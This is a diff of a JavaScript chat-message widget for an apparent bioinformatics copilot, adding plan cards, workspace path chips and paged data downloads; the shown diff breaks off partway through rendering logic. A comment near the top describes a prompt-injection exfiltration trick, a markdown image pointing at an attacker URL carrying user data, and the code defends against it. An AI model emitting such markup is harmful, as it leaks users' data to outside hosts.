@@ -9,15 +9,21 @@ define([
   'markdown-it/dist/markdown-it.min', // Markdown parser and renderer
   'markdown-it-link-attributes/dist/markdown-it-link-attributes.min', // Plugin to add attributes to links
   'dijit/Dialog', // Dialog widget
-  './CopilotToolHandler', // Tool handler for special tool processing
-  './WorkflowEngine', // Workflow engine widget for displaying workflows
-  './workflowForms/CopilotServiceFormAdapter', // Dojo form wrappers for single-step direct form modal
   '../../WorkspaceManager', // Workspace manager for file operations
-  '../../auth/authHeaders' // Authorization header construction
+  './WorkspacePathUtils',
+  './PlanCard', // Plan card widget for planning agent
+  './ClarificationChips', // Clarification chips for planning agent questions
+  './ExecutionBlockedCard', // one-shot "Submit this job" card (plan mode refusals)
+  './CursorDownload', // pages data-API downloads past the 25,000-row cap
+  './ProgressView' // live progress steps and the "What I did" section
 ], function (
-  declare, domConstruct, on, topic, lang, Deferred, request, markdownit, linkAttributes, Dialog, CopilotToolHandler, WorkflowEngine, CopilotServiceFormAdapter, WorkspaceManager,
-  authHeader
+  declare, domConstruct, on, topic, lang, Deferred, request, markdownit, linkAttributes, Dialog, WorkspaceManager, WorkspacePathUtils, PlanCard, ClarificationChips, ExecutionBlockedCard, CursorDownload, ProgressView
 ) {
+  // A view change (options dialog or the card's toggle) re-renders every
+  // open chat through the container.
+  ProgressView.onChange(function(variant) {
+    topic.publish('copilotProgressStyleChanged', variant);
+  });
   /**
    * @class ChatMessage
    * @description Widget that handles rendering individual chat messages with markdown support.
@@ -29,12 +35,26 @@ define([
     message: null,
 
     /** @property {Object} md - Initialized markdown-it instance for rendering markdown content */
-    md: markdownit().use(linkAttributes, {
-      attrs: {
-        target: '_blank',
-        rel: 'noopener noreferrer'
-      }
-    }),
+    md: (function () {
+      var md = markdownit().use(linkAttributes, {
+        attrs: {
+          target: '_blank',
+          rel: 'noopener noreferrer'
+        }
+      });
+      // Render image syntax as an ordinary link, never an <img>. The browser
+      // fetches an <img> the moment it renders, so a prompt-injected
+      // ![](https://attacker/?d=<data>) in a reply would send data out with
+      // no click. Agents never return real images.
+      md.renderer.rules.image = function (tokens, idx) {
+        var token = tokens[idx];
+        var src = token.attrGet('src') || '';
+        var label = '[image: ' + (token.content || src) + ']';
+        return '<a href="' + md.utils.escapeHtml(src) + '" target="_blank" rel="noopener noreferrer">' +
+          md.utils.escapeHtml(label) + '</a>';
+      };
+      return md;
+    })(),
 
     /** @property {number} fontSize - Stores the font size for the message content */
     fontSize: null,
@@ -47,15 +67,6 @@ define([
 
     /** @property {string} sessionId - Current session ID for workflow submission context */
     sessionId: null,
-
-    /** @property {Array} _selectionSubscriptions - Topic subscriptions for cleanup */
-    _selectionSubscriptions: null,
-
-    /** @property {Array} _selectionIndicators - Tracked indicator nodes for reactive updates */
-    _selectionIndicators: null,
-
-    /** @property {Array} _bodyPopovers - Popover nodes appended to document.body for cleanup */
-    _bodyPopovers: null,
 
     /**
      * @constructor
@@ -70,7 +81,6 @@ define([
       this.copilotApi = message.copilotApi || null; // Get copilotApi from message if provided
       this.sessionId = message.sessionId || null; // Get sessionId from message if provided
       this.copilotEnableShowPromptDetails = window.App && window.App.copilotEnableShowPromptDetails === 'true';
-      this.toolHandler = new CopilotToolHandler();
       this.renderMessage(); // Immediately render on construction
     },
 
@@ -88,280 +98,268 @@ define([
       return div.innerHTML;
     },
 
-    _flattenWorkspaceBrowseItems: function(items) {
-      if (!Array.isArray(items)) {
-        return [];
-      }
-
-      var flattened = [];
-      for (var i = 0; i < items.length; i++) {
-        var item = items[i];
-        if (Array.isArray(item)) {
-          flattened.push(item);
-          continue;
-        }
-
-        if (item && typeof item === 'object') {
-          for (var key in item) {
-            if (item.hasOwnProperty(key) && Array.isArray(item[key])) {
-              flattened = flattened.concat(item[key]);
-            }
-          }
-        }
-      }
-
-      return flattened;
-    },
-
-    _getWorkspaceBrowseCount: function(payload) {
-      if (!payload) {
-        return 0;
-      }
-
-      if (payload.result_type === 'search_result') {
-        return this._flattenWorkspaceBrowseItems(payload.items).length;
-      }
-
-      if (typeof payload.count === 'number') {
-        return payload.count;
-      }
-
-      return this._flattenWorkspaceBrowseItems(payload.items).length;
-    },
-
-    _buildWorkspaceBrowserUrl: function(path) {
-      if (!path || typeof path !== 'string') {
-        return null;
-      }
-      var normalizedPath = path.charAt(0) === '/' ? path : '/' + path;
-      return '/workspace' + normalizedPath;
-    },
-
-    _extractRagSummaryText: function() {
-      if (typeof this.message.content === 'object' && this.message.content && this.message.content.type === 'rag_result') {
-        return this.message.content.summary || '';
-      }
-      if (typeof this.message.content === 'string') {
-        return this.message.content;
-      }
-      return '';
-    },
-
-    _buildRagChunkSearchFilters: function() {
-      var seededFilters = this.message && this.message.ragChunkSearchFilters && typeof this.message.ragChunkSearchFilters === 'object'
-        ? this.message.ragChunkSearchFilters
-        : {};
-      var messageToolCall = this._resolveMessageToolCall();
-      var toolArgs = messageToolCall && messageToolCall.arguments_executed && typeof messageToolCall.arguments_executed === 'object'
-        ? messageToolCall.arguments_executed
-        : {};
-      var messageId = this.message && this.message.message_id ? this.message.message_id : null;
-      if (typeof messageId === 'string' && messageId.indexOf('assistant_') === 0) {
-        messageId = null;
-      }
-      return {
-        message_id: seededFilters.message_id || messageId || null,
-        session_id: seededFilters.session_id || this.sessionId || null,
-        user_id: seededFilters.user_id || (this.copilotApi && this.copilotApi.user_id ? this.copilotApi.user_id : null),
-        rag_db: seededFilters.rag_db || toolArgs.rag_db || toolArgs.database_name || toolArgs.config_name || null,
-        rag_api_name: seededFilters.rag_api_name || toolArgs.rag_api_name || null,
-        doc_id: seededFilters.doc_id || toolArgs.doc_id || toolArgs.document_id || null,
-        source_id: seededFilters.source_id || toolArgs.source_id || null,
-        include_content: true,
-        limit: 100
+    _createWorkspacePathChipNode: function(path) {
+      var openLink = WorkspacePathUtils.toWorkspaceBrowserUrl(path);
+      var chipTag = openLink ? 'a' : 'span';
+      var chipAttrs = {
+        className: 'workspace-path-chip'
       };
-    },
+      if (openLink) {
+        chipAttrs.href = openLink;
+        chipAttrs.target = '_blank';
+        chipAttrs.rel = 'noopener noreferrer';
+      }
+      chipAttrs.title = path;
+      var chipNode = domConstruct.create(chipTag, chipAttrs);
 
-    _resolveMessageToolCall: function() {
-      if (!this.message || typeof this.message !== 'object') {
-        return null;
-      }
-      var candidate = null;
+      domConstruct.create('i', {
+        className: 'fa icon-folder-open-o workspace-path-chip-icon'
+      }, chipNode);
 
-      if (this.message.tool_call !== undefined) {
-        candidate = this.message.tool_call;
-      } else if (this.message.ui_tool_call !== undefined) {
-        candidate = this.message.ui_tool_call;
-      } else if (this.message.toolCall !== undefined) {
-        candidate = this.message.toolCall;
-      } else if (
-        this.message.metadata &&
-        typeof this.message.metadata === 'object' &&
-        this.message.metadata.tool_call !== undefined
-      ) {
-        candidate = this.message.metadata.tool_call;
-      } else if (
-        this.message.metadata &&
-        typeof this.message.metadata === 'object' &&
-        this.message.metadata.ui_tool_call !== undefined
-      ) {
-        candidate = this.message.metadata.ui_tool_call;
-      }
+      var segments = path.split('/').filter(function(s) { return s; });
+      var displayName = segments.length > 0 ? segments[segments.length - 1] : path;
 
-      if (!candidate) {
-        return null;
-      }
-      if (typeof candidate === 'string') {
-        try {
-          candidate = JSON.parse(candidate);
-        } catch (e) {
-          return null;
-        }
-      }
-      if (!candidate || typeof candidate !== 'object' || Array.isArray(candidate)) {
-        return null;
-      }
-      return candidate;
+      domConstruct.create('span', {
+        className: 'workspace-path-chip-name',
+        textContent: displayName
+      }, chipNode);
+
+      return chipNode;
     },
 
     /**
-     * Renders a selection indicator on a tool card showing count and hover list.
-     * @param {HTMLElement} containerNode - The tool card to append the indicator to
-     * @param {Object} opts - Options: { category, toolCallId, getSelectedItems }
-     *   category: 'files'|'workflows'|'workspace'|'jobs'
-     *   toolCallId: unique identifier for this tool call (for scoping)
-     *   getSelectedItems: function returning array of {label, id} for current selections
+     * Data-API download links in an answer (TSV / FASTA, http_download=true)
+     * stop at 25,000 rows on the server.  A plain left click pages through the
+     * whole result in the browser instead (CursorDownload); middle-click and
+     * copy-link still get the plain link.  Where the browser has the File
+     * System Access API (Chrome, Edge) the Save dialog opens first and each
+     * page is written to the file as it arrives; elsewhere (Firefox, Safari)
+     * the pages are held in memory and saved at the end.
+     * @private
      */
-    _renderSelectionIndicator: function(containerNode, opts) {
-      if (!containerNode || !opts) return;
-      var category = opts.category || '';
-      var getSelectedItems = opts.getSelectedItems;
-      if (typeof getSelectedItems !== 'function') return;
-
-      var indicatorRow = domConstruct.create('div', {
-        class: 'tool-card-selection-indicator',
-        style: 'display:none;'
-      }, containerNode);
-
-      var countLabel = domConstruct.create('span', {
-        class: 'tool-card-selection-count'
-      }, indicatorRow);
-
-      var infoIcon = domConstruct.create('span', {
-        class: 'tool-card-selection-info-icon',
-        innerHTML: '<i class="fa fa-info-circle"></i>',
-        title: 'View selected items'
-      }, indicatorRow);
-
-      var hoverPopover = domConstruct.create('div', {
-        class: 'tool-card-selection-hover',
-        style: 'display:none;'
-      }, document.body);
-
-      // Track body-appended popover for cleanup
-      if (!this._bodyPopovers) { this._bodyPopovers = []; }
-      this._bodyPopovers.push(hoverPopover);
-
-      var hideTimer = null;
-      var maxDisplay = 20;
-
-      var positionPopover = function() {
-        var rect = indicatorRow.getBoundingClientRect();
-        hoverPopover.style.left = rect.left + 'px';
-        // Position above the indicator row with a 6px gap
-        hoverPopover.style.top = 'auto';
-        hoverPopover.style.bottom = (window.innerHeight - rect.top + 6) + 'px';
-      };
-
-      var hidePopover = function() {
-        if (hideTimer) { clearTimeout(hideTimer); hideTimer = null; }
-        hoverPopover.style.display = 'none';
-      };
-      var scheduleHide = function() {
-        if (hideTimer) { clearTimeout(hideTimer); }
-        hideTimer = setTimeout(hidePopover, 160);
-      };
-      var showPopover = function() {
-        if (hideTimer) { clearTimeout(hideTimer); hideTimer = null; }
-        positionPopover();
-        hoverPopover.style.display = 'block';
-      };
-
-      on(indicatorRow, 'mouseenter', showPopover);
-      on(indicatorRow, 'mouseleave', scheduleHide);
-      on(hoverPopover, 'mouseenter', function() {
-        if (hideTimer) { clearTimeout(hideTimer); hideTimer = null; }
-      });
-      on(hoverPopover, 'mouseleave', scheduleHide);
-
-      var updateIndicator = function() {
-        var items = getSelectedItems();
-        var count = Array.isArray(items) ? items.length : 0;
-        if (count === 0) {
-          indicatorRow.style.display = 'none';
+    _wireCursorDownloads: function (contentNode) {
+      on(contentNode, 'click', lang.hitch(this, function (evt) {
+        if (evt.defaultPrevented || evt.button !== 0 || evt.ctrlKey || evt.metaKey || evt.shiftKey || evt.altKey) {
           return;
         }
-        indicatorRow.style.display = '';
-        countLabel.textContent = count + ' selected';
+        var link = evt.target && evt.target.closest ? evt.target.closest('a[href]') : null;
+        if (!link || !contentNode.contains(link)) return;
+        var href = link.getAttribute('href');
+        if (!CursorDownload.canPage(CursorDownload.parseDownloadUrl(href))) return;
+        evt.preventDefault();
+        if (typeof window.showSaveFilePicker !== 'function') {
+          this._runCursorDownload(href, null);
+          return;
+        }
+        // Must be called while the click still counts as a user action, so
+        // before anything is fetched.
+        window.showSaveFilePicker(CursorDownload.saveOptions(href)).then(lang.hitch(this, function (handle) {
+          return handle.createWritable().then(lang.hitch(this, function (writable) {
+            this._runCursorDownload(href, { writable: writable, name: handle.name });
+          }));
+        }), lang.hitch(this, function (err) {
+          if (err && err.name === 'AbortError') return; // the Save dialog was closed
+          this._runCursorDownload(href, null); // refused (e.g. inside a frame): keep it in memory
+        }));
+      }));
+    },
 
-        // Rebuild popover content
-        hoverPopover.innerHTML = '';
-        items.slice(0, maxDisplay).forEach(function(item) {
-          var itemNode = document.createElement('div');
-          itemNode.className = 'tool-card-selection-hover-item';
-          itemNode.textContent = (item && item.label) ? item.label : String(item);
-          hoverPopover.appendChild(itemNode);
-        });
-        if (items.length > maxDisplay) {
-          var moreNode = document.createElement('div');
-          moreNode.className = 'tool-card-selection-hover-more';
-          moreNode.textContent = '+ ' + (items.length - maxDisplay) + ' more';
-          hoverPopover.appendChild(moreNode);
+    /**
+     * Runs one paged download with a progress dialog (Cancel).  With a file
+     * ({writable, name} from the Save dialog) each page is written as it
+     * arrives and a cancelled or failed download discards the file; without
+     * one the pages are joined and saved at the end.
+     * @private
+     */
+    _runCursorDownload: function (href, file) {
+      var cancelled = false;
+      var discarded = false;
+      var discard = function () {
+        if (file && !discarded) {
+          discarded = true;
+          file.writable.abort().catch(function () {});
         }
       };
-
-      // Initial render
-      updateIndicator();
-
-      // Track for reactive updates
-      if (!this._selectionIndicators) {
-        this._selectionIndicators = [];
+      // Fixed width with wrapping: the long "Download anyway?" text otherwise
+      // widened the dialog past the window.
+      var box = domConstruct.create('div', { style: 'padding: 16px; width: 380px; max-width: 80vw; box-sizing: border-box;' });
+      var status = domConstruct.create('div', {
+        style: 'margin-bottom: 12px; font-size: 13px; color: #333; white-space: normal; overflow-wrap: anywhere;'
+      }, box);
+      var barOuter = domConstruct.create('div', {
+        style: 'width: 100%; height: 20px; background: #e0e0e0; border-radius: 4px; overflow: hidden; margin-bottom: 12px;'
+      }, box);
+      var bar = domConstruct.create('div', {
+        style: 'width: 0%; height: 100%; background: #2196F3; transition: width 0.3s ease;'
+      }, barOuter);
+      var count = domConstruct.create('div', { style: 'margin-bottom: 16px; font-size: 12px; color: #666; text-align: center;' }, box);
+      // In-memory path only (Firefox, Safari: no File System Access API).
+      if (!file) {
+        domConstruct.create('div', {
+          style: 'margin-bottom: 12px; font-size: 12px; color: #666; white-space: normal;',
+          textContent: 'This browser cannot save straight to a file, so the download is held in memory '
+            + 'until it finishes. For very large downloads, Chrome or Edge write the file as it downloads.'
+        }, box);
       }
-      this._selectionIndicators.push({
-        category: category,
-        update: updateIndicator
+      var buttons = domConstruct.create('div', { style: 'text-align: center;' }, box);
+      var cancelBtn = domConstruct.create('button', { type: 'button', class: 'chat-card-btn', textContent: 'Cancel' }, buttons);
+      status.textContent = 'Preparing the download…';
+
+      var dlg = new Dialog({
+        title: 'Downloading data', content: box, closable: false, style: 'z-index: 10000;'
       });
+      var close = function () {
+        dlg.hide();
+        setTimeout(function () { dlg.destroyRecursive(); }, 300);
+      };
+      var cancelHandle = on(cancelBtn, 'click', function () {
+        cancelled = true;
+        discard();
+        close();
+      });
+      dlg.show();
 
-      // Subscribe to selection changes if not already subscribed
-      this._ensureSelectionSubscription();
-    },
+      var fmt = function (n) { return Number(n).toLocaleString(); };
+      var finish = function (message) {
+        cancelHandle.remove();
+        status.textContent = message;
+        domConstruct.empty(buttons);
+        on(domConstruct.create('button', { type: 'button', class: 'chat-card-btn', textContent: 'Close' }, buttons), 'click', close);
+      };
 
-    /**
-     * Subscribes to CopilotSelectionChanged topic for reactive tool card updates.
-     * Only subscribes once per ChatMessage instance.
-     */
-    _ensureSelectionSubscription: function() {
-      if (this._selectionSubscriptions) return;
-      this._selectionSubscriptions = [];
-      if (!this._selectionDataByCategory) {
-        this._selectionDataByCategory = {};
-      }
-      this._selectionSubscriptions.push(
-        topic.subscribe('CopilotSelectionChanged', lang.hitch(this, function(payload) {
-          if (!payload || !payload.category) return;
-          // Cache the latest selection data per category
-          this._selectionDataByCategory[payload.category] = Array.isArray(payload.items) ? payload.items : [];
-          if (!this._selectionIndicators) return;
-          var changedCategory = payload.category;
-          this._selectionIndicators.forEach(function(indicator) {
-            if (!changedCategory || indicator.category === changedCategory) {
-              indicator.update();
-            }
+      CursorDownload.run(href, {
+        fetch: window.fetch.bind(window),
+        token: (window.App && window.App.authorizationToken) || null,
+        sink: file ? { write: function (text) { return file.writable.write(text); } } : null,
+        isCancelled: function () { return cancelled; },
+        onProgress: function (rows, total) {
+          status.textContent = 'Downloading…';
+          if (total) {
+            var pct = Math.min(100, Math.round((rows / total) * 100));
+            bar.style.width = pct + '%';
+            count.textContent = fmt(rows) + ' of ' + fmt(total) + ' rows (' + pct + '%)';
+          } else {
+            count.textContent = fmt(rows) + ' rows…';
+          }
+        },
+        confirmLarge: function (total) {
+          return new Promise(function (resolve) {
+            status.textContent = 'This download has ' + fmt(total) + ' rows. Your browser holds it in memory '
+                + 'until it is saved, which may be slow or fail on a small machine. Download anyway?';
+            domConstruct.empty(buttons);
+            on(domConstruct.create('button', {
+              type: 'button',
+              class: 'chat-card-btn',
+              textContent: 'Download',
+              style: 'margin-right: 8px;'
+            }, buttons), 'click', function () {
+              domConstruct.empty(buttons);
+              buttons.appendChild(cancelBtn);
+              resolve(true);
+            });
+            on(domConstruct.create('button', { type: 'button', class: 'chat-card-btn', textContent: 'Cancel' }, buttons),
+              'click',
+              function () {
+                cancelled = true;
+                close();
+                resolve(false);
+              });
           });
-        }))
-      );
+        }
+      }).then(function (result) {
+        if (cancelled || !result || result.cancelled) {
+          discard();
+          return;
+        }
+        if (!result.rows) {
+          discard();
+          finish('No rows matched this query, so there is nothing to download.');
+          return;
+        }
+        if (file) {
+          return file.writable.close().then(function () {
+            bar.style.width = '100%';
+            finish('Saved ' + fmt(result.rows) + ' rows to ' + file.name + '.');
+          });
+        }
+        var blobUrl = URL.createObjectURL(new Blob(result.parts, { type: result.mime }));
+        var a = domConstruct.create('a', { href: blobUrl, download: result.fileName, style: 'display: none;' }, document.body);
+        a.click();
+        setTimeout(function () {
+          URL.revokeObjectURL(blobUrl);
+          domConstruct.destroy(a);
+        }, 1000);
+        bar.style.width = '100%';
+        finish('Saved ' + fmt(result.rows) + ' rows as ' + result.fileName + '.');
+      }).then(null, function (err) {
+        discard();
+        if (cancelled) return;
+        finish('The download failed: ' + (err && err.message ? err.message : err)
+            + '. The plain link (first 25,000 rows) still works with a middle-click.');
+      });
     },
 
-    /**
-     * Returns the cached selection items for a given category.
-     * @param {string} category - The selection category
-     * @returns {Array} Current selected items
-     */
-    _getSelectionItemsForCategory: function(category) {
-      if (!this._selectionDataByCategory) {
-        this._selectionDataByCategory = {};
+    _decorateWorkspacePaths: function(contentNode) {
+      if (!contentNode || typeof contentNode.querySelectorAll !== 'function') {
+        return;
       }
-      return this._selectionDataByCategory[category] || [];
+      var showTextMask = (window.NodeFilter && window.NodeFilter.SHOW_TEXT) ? window.NodeFilter.SHOW_TEXT : 4;
+      var walker = document.createTreeWalker(contentNode, showTextMask, null, false);
+      var textNodes = [];
+      var currentNode = walker.nextNode();
+      while (currentNode) {
+        textNodes.push(currentNode);
+        currentNode = walker.nextNode();
+      }
+
+      textNodes.forEach(lang.hitch(this, function(textNode) {
+        if (!textNode || !textNode.nodeValue) {
+          return;
+        }
+        var parentElement = textNode.parentElement;
+        if (!parentElement) {
+          return;
+        }
+        var parentTag = parentElement.tagName ? parentElement.tagName.toLowerCase() : '';
+        if (parentTag === 'code') {
+          // Inline code whose whole text is one workspace path becomes a
+          // chip (agents write paths in backticks); code blocks, links and
+          // code with anything else in it stay as they are.
+          var grandTag = parentElement.parentElement && parentElement.parentElement.tagName
+            ? parentElement.parentElement.tagName.toLowerCase() : '';
+          var codePath = WorkspacePathUtils.wholePath(parentElement.textContent);
+          if (codePath && grandTag !== 'pre' && grandTag !== 'a' && parentElement.parentNode) {
+            parentElement.parentNode.replaceChild(this._createWorkspacePathChipNode(codePath), parentElement);
+          }
+          return;
+        }
+        if (parentTag === 'pre' || parentTag === 'a' || parentTag === 'script' || parentTag === 'style') {
+          return;
+        }
+
+        var textValue = textNode.nodeValue;
+        var matches = WorkspacePathUtils.findPathMatches(textValue);
+        if (!matches.length) {
+          return;
+        }
+
+        var fragment = document.createDocumentFragment();
+        var cursor = 0;
+        matches.forEach(lang.hitch(this, function(match) {
+          // The chip replaces the path and its quotes, if any.
+          if (match.outerStart > cursor) {
+            fragment.appendChild(document.createTextNode(textValue.slice(cursor, match.outerStart)));
+          }
+          fragment.appendChild(this._createWorkspacePathChipNode(match.path));
+          cursor = match.outerEnd;
+        }));
+        if (cursor < textValue.length) {
+          fragment.appendChild(document.createTextNode(textValue.slice(cursor)));
+        }
+        if (textNode.parentNode) {
+          textNode.parentNode.replaceChild(fragment, textNode);
+        }
+      }));
     },
 
     /**
@@ -374,261 +372,53 @@ define([
      *   3. User/Assistant messages (standard display)
      */
     renderMessage: function() {
-      // Check if content is a JSON string containing source_tool (for real-time results)
-      var sourceTool = this.message.ui_source_tool || this.message.source_tool;
-      var contentToProcess = this.message.content;
-      var messageToolCall = this._resolveMessageToolCall();
-      if (messageToolCall && !this.message.tool_call) {
-        this.message.tool_call = messageToolCall;
-      }
-
-      if (!sourceTool && typeof this.message.content === 'string') {
-        try {
-          // Try to parse the content as JSON to see if source_tool is inside
-          var parsedContent = JSON.parse(this.message.content);
-          if (parsedContent && parsedContent.source_tool) {
-            sourceTool = parsedContent.source_tool;
-            // Set it on the message object for consistency
-            this.message.source_tool = sourceTool;
-            // Use the parsed content for processing
-            contentToProcess = parsedContent;
-          }
-        } catch (e) {
-          // Not valid JSON, continue with normal processing
-          // Silently skip source_tool extraction for non-JSON content
+      // Hide auto-generated plan action user messages ("Execute plan step: ...",
+      // "Execute approved plan: ...", etc.). These are system-triggered, not
+      // user-typed, and clutter the chat. The plan card shows step progress.
+      if (this.message && this.message.role === 'user') {
+        var content = (typeof this.message.content === 'string') ? this.message.content : '';
+        if (content.match(/^(Execute plan step:|Execute approved plan:|Skip step and continue|Continue after review)/)) {
+          return;  // Don't render these auto-generated messages
         }
       }
 
-      // Reloaded session messages may carry canonical tool_call without source_tool.
-      // Use it as fallback so tool-specific UI rendering still activates.
-      if (messageToolCall && typeof (messageToolCall.tool || messageToolCall.tool_id) === 'string') {
-        var toolCallId = messageToolCall.tool || messageToolCall.tool_id;
-        var sourceToolLooksLikeTransport =
-          typeof sourceTool === 'string' &&
-          (
-            sourceTool.indexOf('read_file_bytes_tool') !== -1 ||
-            sourceTool.indexOf('read_file_tool') !== -1
-          );
-        if (!sourceTool || sourceToolLooksLikeTransport) {
-          sourceTool = toolCallId;
+      // Omit empty assistant messages (common during planning/clarification flows).
+      // We only skip if there's no visible content and no card to render.
+      if (this.message && this.message.role === 'assistant') {
+        var hasText = typeof this.message.content === 'string' && this.message.content.trim() !== '';
+        var hasWidget = !!(
+          this.message.card ||
+          this.message.workflow ||
+          this.message.workflowData
+        );
+        if (!hasText && !hasWidget) {
+          return;
         }
-      }
-      if (sourceTool) {
-        this.message.source_tool = sourceTool;
-      }
-      // debugger;
-      var contentLooksLikeJson = false;
-      if (typeof contentToProcess === 'string') {
-        var trimmedContent = contentToProcess.trim();
-        contentLooksLikeJson = trimmedContent.indexOf('{') === 0 || trimmedContent.indexOf('[') === 0;
-      }
-      var toolCallArgs = messageToolCall && messageToolCall.arguments_executed && typeof messageToolCall.arguments_executed === 'object'
-        ? messageToolCall.arguments_executed
-        : {};
-
-      // Infer lightweight tool-card metadata from persisted tool identity.
-      if (sourceTool && (sourceTool.indexOf('workspace_browse_tool') !== -1 ||
-          sourceTool.indexOf('list_genome_groups') !== -1 ||
-          sourceTool.indexOf('list_feature_groups') !== -1)) {
-        this.message.isWorkspaceBrowse = true;
-        if (!this.message.uiAction) {
-          this.message.uiAction = 'open_workspace_tab';
-        }
-      }
-      if (sourceTool && (sourceTool.indexOf('list_jobs') !== -1 || sourceTool.indexOf('get_recent_jobs') !== -1)) {
-        this.message.isJobsBrowse = true;
-        if (!this.message.uiAction) {
-          this.message.uiAction = 'open_jobs_tab';
-        }
-      }
-      if (sourceTool && (sourceTool.indexOf('plan_workflow') !== -1 ||
-          sourceTool.indexOf('submit_workflow') !== -1 ||
-          sourceTool.indexOf('plan_genome_assembly') !== -1 ||
-          sourceTool.indexOf('plan_genome_annotation') !== -1 ||
-          sourceTool.indexOf('plan_comparative_systems') !== -1)) {
-        var inferredWorkflowId = this.message.workflow_id ||
-          toolCallArgs.workflow_id ||
-          (messageToolCall && messageToolCall.workflow_id) ||
-          (this.message.workflowData && this.message.workflowData.workflow_id) ||
-          (this.message.workflowData && this.message.workflowData.execution_metadata && this.message.workflowData.execution_metadata.workflow_id) ||
-          null;
-        if (inferredWorkflowId) {
-          this.message.isWorkflow = true;
-          this.message.workflow_id = inferredWorkflowId;
-          if (!this.message.workflowData || typeof this.message.workflowData !== 'object') {
-            this.message.workflowData = { workflow_id: inferredWorkflowId };
-          } else if (!this.message.workflowData.workflow_id) {
-            this.message.workflowData.workflow_id = inferredWorkflowId;
-          }
-        }
-      }
-      if (
-        sourceTool &&
-        (
-          sourceTool.indexOf('bvbrc_search_data') !== -1 ||
-          sourceTool.indexOf('query_collection') !== -1 ||
-          sourceTool.indexOf('bvbrc_query_collection') !== -1
-        )
-      ) {
-        this.message.isQueryCollection = true;
-        if (!this.message.queryCollectionData) {
-          // Reconstruct snapshot metadata from persisted tool_call.replay
-          var replayMeta = (messageToolCall && messageToolCall.replay && typeof messageToolCall.replay === 'object')
-            ? messageToolCall.replay
-            : {};
-          var restoredDownloadUrl = replayMeta.download_url || null;
-          // If a download_url exists, this was a snapshot result
-          var restoredIsSnapshot = !!restoredDownloadUrl;
-          // Extract numFound from download URL limit(N) parameter
-          var restoredNumFound = null;
-          if (restoredDownloadUrl) {
-            var limitMatch = restoredDownloadUrl.match(/[&?]limit\((\d+)\)/);
-            if (limitMatch) {
-              restoredNumFound = parseInt(limitMatch[1], 10);
-            }
-          }
-
-          this.message.queryCollectionData = {
-            queryParameters: toolCallArgs,
-            collection: toolCallArgs.collection || null,
-            rqlQueryUrl: toolCallArgs.data_api_base_url ? toolCallArgs.data_api_base_url : "https://www.bv-brc.org/api-bulk",
-            resultRows: [],
-            // Snapshot metadata restored from tool_call.replay
-            download_url: restoredDownloadUrl,
-            is_snapshot: restoredIsSnapshot,
-            numFound: restoredNumFound,
-            snapshot_limit: null
-          };
-        }
-      }
-      // Ensure persisted tool_call survives downstream processing.
-      if (messageToolCall && !this.message.tool_call) {
-        this.message.tool_call = messageToolCall;
-      }
-
-      // Process content based on source_tool using tool handler
-      // Skip processing if the message already has processed tool data (uiPayload/workspaceBrowseResult)
-      // This happens when SSE handler already processed the tool output
-      var alreadyProcessed = false;
-      if ((sourceTool === 'bvbrc_server.workspace_browse_tool' ||
-          (sourceTool && (sourceTool.indexOf('list_genome_groups') !== -1 || sourceTool.indexOf('list_feature_groups') !== -1))) &&
-          this.message.uiPayload && this.message.workspaceBrowseResult) {
-        console.log('[ChatMessage] Workspace browse / group list already processed by SSE handler, skipping re-processing');
-        alreadyProcessed = true;
-      }
-      if (
-        sourceTool &&
-        (sourceTool.indexOf('list_jobs') !== -1 || sourceTool.indexOf('get_recent_jobs') !== -1) &&
-        this.message.uiPayload &&
-        this.message.jobsBrowseResult
-      ) {
-        console.log('[ChatMessage] Jobs browse already processed by SSE handler, skipping re-processing');
-        alreadyProcessed = true;
-      }
-      if (
-        sourceTool &&
-        (sourceTool.indexOf('plan_workflow') !== -1 ||
-          sourceTool.indexOf('submit_workflow') !== -1 ||
-          sourceTool.indexOf('plan_genome_assembly') !== -1 ||
-          sourceTool.indexOf('plan_genome_annotation') !== -1 ||
-          sourceTool.indexOf('plan_comparative_systems') !== -1) &&
-        (this.message.workflowData || this.message.workflow_id || this.message.isWorkflow)
-      ) {
-        console.log('[ChatMessage] Workflow message already has persisted workflow metadata, skipping re-processing');
-        alreadyProcessed = true;
-      }
-      if (
-        sourceTool &&
-        (sourceTool.indexOf('workspace_browse_tool') !== -1 ||
-          sourceTool.indexOf('list_genome_groups') !== -1 ||
-          sourceTool.indexOf('list_feature_groups') !== -1) &&
-        messageToolCall &&
-        !contentLooksLikeJson
-      ) {
-        alreadyProcessed = true;
-      }
-      if (
-        sourceTool &&
-        (sourceTool.indexOf('list_jobs') !== -1 || sourceTool.indexOf('get_recent_jobs') !== -1) &&
-        messageToolCall &&
-        !contentLooksLikeJson
-      ) {
-        alreadyProcessed = true;
-      }
-      if (
-        sourceTool &&
-        (
-          sourceTool.indexOf('bvbrc_search_data') !== -1 ||
-          sourceTool.indexOf('query_collection') !== -1 ||
-          sourceTool.indexOf('bvbrc_query_collection') !== -1
-        ) &&
-        messageToolCall &&
-        !contentLooksLikeJson
-      ) {
-        // Persisted session messages are often markdown summaries with tool_call metadata.
-        // Skip re-processing so we don't erase query-card flags inferred above.
-        alreadyProcessed = true;
-      }
-
-      // debugger;
-      if (sourceTool && !alreadyProcessed) {
-        // If content is an object with nested structure, extract the actual content
-        if (typeof contentToProcess === 'object' && contentToProcess.content) {
-          contentToProcess = contentToProcess.content;
-        }
-
-        var processedData = this.toolHandler.processMessageContent(contentToProcess, sourceTool);
-
-        this.message.content = processedData.content;
-        this.message.isWorkflow = typeof processedData.isWorkflow !== 'undefined' ? processedData.isWorkflow : this.message.isWorkflow;
-        this.message.workflowData = typeof processedData.workflowData !== 'undefined' ? processedData.workflowData : this.message.workflowData;
-        this.message.isWorkspaceBrowse = typeof processedData.isWorkspaceBrowse !== 'undefined'
-          ? (processedData.isWorkspaceBrowse || this.message.isWorkspaceBrowse)
-          : this.message.isWorkspaceBrowse;
-        this.message.workspaceBrowseResult = typeof processedData.workspaceBrowseResult !== 'undefined'
-          ? (processedData.workspaceBrowseResult || this.message.workspaceBrowseResult)
-          : this.message.workspaceBrowseResult;
-        this.message.chatSummary = typeof processedData.chatSummary !== 'undefined' ? processedData.chatSummary : this.message.chatSummary;
-        this.message.uiPayload = typeof processedData.uiPayload !== 'undefined' ? processedData.uiPayload : this.message.uiPayload;
-        this.message.uiAction = typeof processedData.uiAction !== 'undefined' ? processedData.uiAction : this.message.uiAction;
-        this.message.isWorkspaceListing = typeof processedData.isWorkspaceListing !== 'undefined' ? processedData.isWorkspaceListing : this.message.isWorkspaceListing;
-        this.message.workspaceData = typeof processedData.workspaceData !== 'undefined' ? processedData.workspaceData : this.message.workspaceData;
